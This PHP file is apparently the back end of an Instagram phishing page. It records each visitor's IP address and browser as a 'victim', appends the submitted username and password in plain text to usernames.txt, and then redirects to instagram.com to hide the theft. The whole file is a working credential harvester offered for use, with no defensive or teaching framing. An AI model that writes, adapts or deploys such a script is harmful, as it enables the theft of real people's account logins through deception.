<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";

    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check if ip is pass from proxy
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";

    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";

    }
$useragent = " | Victim Browser:    ";

$browser = $_SERVER['HTTP_USER_AGENT'];



$file = 'usernames.txt';
$victim = " | Victim IP address: ";

$fp = fopen($file, 'a');


fwrite($fp, $victim);

fwrite($fp, $ipaddress);

fwrite($fp, $useragent);

fwrite($fp, $browser);



fclose($fp);


file_put_contents("usernames.txt", "\n |\n | Account:           " . $_POST['username'] . "\n | Password:          " . $_POST['password'] . "\n\n\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
